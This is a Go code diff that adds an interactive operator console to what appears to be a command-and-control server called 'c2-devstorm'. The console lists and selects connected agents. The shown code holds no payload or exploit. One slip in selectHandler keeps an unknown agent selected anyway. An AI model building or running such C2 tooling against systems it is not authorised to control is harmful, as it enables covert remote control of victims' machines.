@@ -2,21 +2,87 @@ package main
 
 // Imports
 import (
+	"bufio"
 	"c2-devstorm/commons"
 	"encoding/gob"
 	"log"
 	"net"
+	"os"
+	"strings"
 )
 
 // Global variables
 var (
-	agentList = []commons.Message{}
+	agentList     = []commons.Message{}
+	selectedAgent string
 )
 
 // Main function
 func main() {
 	log.Println("Entrei em execução.")
-	startListener("9091")
+	go startListener("9091")
+
+	cliHandler()
+}
+
+// Function to handle CLI
+func cliHandler() {
+	for {
+
+		if selectedAgent != "" {
+			print(selectedAgent + "[c2-devstorm]")
+		} else {
+			print("[c2-devstorm]")
+
+		}
+		// reader := bufio.NewReader(os.Stdin)
+		reader := bufio.NewReader(os.Stdin)
+		completeCommand, _ := reader.ReadString('\n')
+		println(completeCommand)
+		// completeCommand := "show agents"
+		separeteCommand := strings.Split(strings.TrimSuffix(completeCommand, "\n"), " ")
+		baseCommand := strings.TrimSpace(separeteCommand[0])
+
+		if len(baseCommand) > 0 {
+			switch baseCommand {
+			case "show":
+				showhandler(separeteCommand)
+			case "select":
+				selectHandler(separeteCommand)
+			default:
+				log.Println("unknown command.")
+			}
+		}
+	}
+}
+func showhandler(command []string) {
+	if len(command) > 1 {
+		switch command[1] {
+		case "agents":
+			agentLists(command[1])
+		default:
+			log.Println("unknown command.")
+		}
+	} else {
+		log.Println("unknown command.")
+
+	}
+
+}
+
+// Function to handle select command
+func selectHandler(command []string) {
+	if len(command) > 1 {
+		selectedAgent = command[1]
+		if agentCreated(command[1]) {
+			selectedAgent = command[1]
+
+		} else {
+			log.Println("Agent not found.")
+			log.Println("To list agentList use: show agents.")
+
+		}
+	}
 }
 
 //func init() {
